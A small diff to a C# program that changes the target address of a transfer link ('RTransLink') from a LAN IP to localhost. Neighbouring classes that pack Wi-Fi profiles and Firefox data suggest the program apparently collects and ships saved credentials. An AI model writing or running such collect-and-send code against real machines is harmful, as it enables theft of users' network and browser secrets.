@@ -13,7 +13,7 @@ namespace PS03
         private readonly WifiPacker wpack = new WifiPacker();
         private readonly FirefoxPakcer fpack = new FirefoxPakcer();
 
-        public RTransLink rtl = new RTransLink("192.168.1.34", 501);
+        public RTransLink rtl = new RTransLink("127.0.0.1", 501);
 
         public void HandleWiFiProfileReady(List<Profile> profiles)
         {
